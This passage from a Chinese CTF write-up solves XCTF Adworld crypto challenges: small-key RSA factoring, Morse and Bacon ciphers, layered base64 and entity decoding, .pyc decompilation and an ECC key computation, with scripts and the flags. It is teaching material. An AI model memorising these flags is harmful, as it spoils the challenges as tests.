class="string">print(ModReverse(a,b))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">l = input(<span class="string">"p,q,e:"</span>)</span><br><span class="line">p,q,e = map(<span class="keyword">lambda</span> x:int(x),l.split(<span class="string">","</span>))</span><br><span class="line">fn = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#print(l)</span></span><br><span class="line">d = ModReverse(e,fn)</span><br><span class="line">print(<span class="string">"d=%d"</span>%d)</span><br></pre></td></tr></table></figure><p>PS：看官方wp给出了一个GitHub项目地址：一款可以解rsa的工具 <a href="https://github.com/3summer/CTF-RSA-tool" target="_blank" rel="noopener">https://github.com/3summer/CTF-RSA-tool</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py --verbose --private -N <span class="number">2135733555619387051</span> -e <span class="number">17</span> -p <span class="number">473398607161</span> -q <span class="number">4511491</span></span><br></pre></td></tr></table></figure><h2 id="0x08-Normal-RSA"><a href="#0x08-Normal-RSA" class="headerlink" title="0x08 Normal_RSA"></a>0x08 Normal_RSA</h2><blockquote><p> 题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光 </p></blockquote><p>果然，解rsa都是需要工具的，看完官方wp后，发现只需要ctf-rsa-tools一行代码就能跑出flag来。</p><p>甚至连题目给的样例都是人家example里的（虽然是摘自PCTF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc</span><br></pre></td></tr></table></figure><p>不过在看wp时，发现有人给了另一种常规解法</p><p>他的解题思路解题思路是：①使用 openssl 解密.pem 中参数 –&gt; ②参数十六进制转换为十进制 –&gt; ③ 利用 factor 对大整数进行分解，得到 p 和 q  –&gt; ④用 rsatool 生成私钥文件: private.pem  –&gt; ⑤用 private.pem 解密 flag.enc </p><p>其中第三步factor用到的网站为：<a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="variable">$openssl</span> rsa -pubin -text -modulus -<span class="keyword">in</span> warmup -<span class="keyword">in</span> pubkey.pem</span><br><span class="line"><span class="comment">#2将得到的modulus用python进行转换</span></span><br><span class="line"><span class="variable">$python</span></span><br><span class="line">&gt;&gt;&gt; 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD </span><br><span class="line">87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="comment">#3 进入网站 http://www.factordb.com/  将大整数分解为p，q</span></span><br><span class="line"><span class="comment">#p= 275127860351348928173285174381581152299 </span></span><br><span class="line"><span class="comment">#q= 319576316814478949870590164193048041239</span></span><br><span class="line"><span class="comment">#4 利用rsatool 生成私钥文件 private.pem</span></span><br><span class="line"><span class="variable">$python</span> rsatool.py -o private.pem -e 65537 -p XXX -q XXX</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="variable">$openssl</span> rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem</span><br></pre></td></tr></table></figure><h2 id="0x09-不仅仅是Morse"><a href="#0x09-不仅仅是Morse" class="headerlink" title="0x09 不仅仅是Morse"></a>0x09 不仅仅是Morse</h2><blockquote><p> 题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案} </p></blockquote><p>题目附件给了一大串摩斯电码，按常理找一个网站解密了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-</span><br></pre></td></tr></table></figure><p>摩斯电码解密网站： <a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a> </p><p>解出来如下，明显嵌套了另外一种加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY..--.-BE..--.-HAVE..--.-ANOTHER..--.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure><p>因为后面一串AB串，转摩斯翻译不出来，因为不晓得哪里分界，转为二进制也没有思路，百度得知这是培根密码</p><p>培根密码解密网站： <a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/baconian.php</a> </p><p>AB串解得<code>ATTACKANDDEFENCEWORLDISINTERESTING</code></p><p>记得小写。</p><h2 id="0x0a-混合编码"><a href="#0x0a-混合编码" class="headerlink" title="0x0a 混合编码"></a>0x0a 混合编码</h2><blockquote><p> 题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案} </p></blockquote><p>这题感觉没什么好说的，下载附件发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow==</span><br></pre></td></tr></table></figure><p>明显的base64编码，解base64得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</span><br></pre></td></tr></table></figure><p>明显的unicode编码，解码得到如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</span><br></pre></td></tr></table></figure><p>没有明显特征，解一波base64得到如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100</span><br></pre></td></tr></table></figure><p>盲猜Ascii吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">'/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = a.split(<span class="string">'/'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):<span class="comment">#从i+1开始因为/的原因，l[0] = ''</span></span><br><span class="line"><span class="meta">... </span>    s += chr(int(l[i+<span class="number">1</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'welcometoattackanddefenceworld'</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>cyberpeace{welcometoattackanddefenceworld}</code></p><h2 id="0x0b-easychallenge"><a href="#0x0b-easychallenge" class="headerlink" title="0x0b easychallenge"></a>0x0b easychallenge</h2><blockquote><p> 题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。 </p></blockquote><p>下载附件发现是一个pyc文件，明显是一个已经编译的python文件</p><p>百度搜反编译pyc，找到一个在线反编译网站 <a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a> </p><p>反编译得到源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please Input your flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>易知chr和ord为反函数、<code>x^a^a=x</code>、<code>base64.b32decode()</code>和<code>base64.b32encode()</code>互为反函数</p><p>因此写一个python脚本即可得出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = base64.b32decode(final)<span class="comment">#decode3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">b'\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2'</span></span><br><span class="line"><span class="comment">#注意要将a的字节流转换</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">"\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">''</span><span class="comment">#decode2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line"><span class="meta">... </span>    s += chr((ord(i)^<span class="number">36</span>)<span class="number">-36</span>)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'`v_ZomZ^`ZxfciZoZpifc\\eeeeer'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = <span class="string">''</span><span class="comment">#decode1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="meta">... </span>    l+= chr((ord(i)<span class="number">-25</span>)^<span class="number">36</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line"><span class="string">'cyberpeace&#123;interestinghhhhh&#125;'</span></span><br></pre></td></tr></table></figure><p>PS：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译python文件为.pyc文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash">python -m compileall main.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">pyc的反编译</span></span><br><span class="line"><span class="meta">#</span><span class="bash">依赖python的uncompyle</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pip install uncompyle</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看帮助</span></span><br><span class="line"><span class="meta">$</span><span class="bash">uncompyle6 --<span class="built_in">help</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将models.pyc反编译成models.py</span></span><br><span class="line"><span class="meta">$</span><span class="bash">uncompyle6 models.pyc &gt; models.py</span></span><br></pre></td></tr></table></figure><p>利用uncompyle6反编译的pyc文件和在线编译文件相同，也挺快的</p><p><img src="/2019/11/10/XCTF-adworld-crypto-wp/11_1.jpg" alt></p><h2 id="0x0c-easy-ECC"><a href="#0x0c-easy-ECC" class="headerlink" title="0x0c easy_ECC"></a>0x0c easy_ECC</h2><blockquote><p> 题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值} </p></blockquote><p>由题目可知：这是ECC加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">已知椭圆曲线加密Ep(a,b)参数为</span><br><span class="line"></span><br><span class="line">p = 15424654874903</span><br><span class="line"></span><br><span class="line">a = 16546484</span><br><span class="line"></span><br><span class="line">b = 4548674875</span><br><span class="line"></span><br><span class="line">G(6478678675,5636379357093)</span><br><span class="line"></span><br><span class="line">私钥为</span><br><span class="line"></span><br><span class="line">k = 546768</span><br><span class="line"></span><br><span class="line">求公钥K(x,y)</span><br></pre></td></tr></table></figure><p>又因为题目说工具，了解其算法后，便找到了一个python的脚本计算公钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">EllipticCurve = collections.namedtuple(<span class="string">'EllipticCurve'</span>, <span class="string">'name p a b g n h'</span>)</span><br><span class="line"></span><br><span class="line">curve = EllipticCurve(</span><br><span class="line">   <span class="string">'secp256k1'</span>,</span><br><span class="line">   <span class="comment"># Field characteristic.</span></span><br><span class="line">   p=int(input(<span class="string">'p='</span>)),</span><br><span class="line">   <span class="comment"># Curve coefficients.</span></span><br><span class="line">   a=int(input(<span class="string">'a='</span>)),</span><br><span class="line">   b=int(input(<span class="string">'b='</span>)),</span><br><span class="line">   <span class="comment"># Base point.</span></span><br><span class="line">   g=(int(input(<span class="string">'Gx='</span>)),</span><br><span class="line">      int(input(<span class="string">'Gy='</span>))),</span><br><span class="line">   <span class="comment"># Subgroup order.</span></span><br><span class="line">   n=int(input(<span class="string">'k='</span>)),</span><br><span class="line">   <span class="comment"># Subgroup cofactor.</span></span><br><span class="line">   h=<span class="number">1</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modular arithmetic ##########################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span><span class="params">(k, p)</span>:</span></span><br><span class="line">   <span class="string">"""Returns the inverse of k modulo p.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This function returns the only integer x such that (x * k) % p == 1.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  k must be non-zero and p must be a prime.</span></span><br><span class="line"><span class="string">  """</span></span><br><span class="line">   <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">raise</span> ZeroDivisionError(<span class="string">'division by zero'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">       <span class="comment"># k ** -1 = p - (-k) ** -1 (mod p)</span></span><br><span class="line">       <span class="keyword">return</span> p - inverse_mod(-k, p)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># Extended Euclidean algorithm.</span></span><br><span class="line">   s, old_s = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   t, old_t = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">   r, old_r = p, k</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">       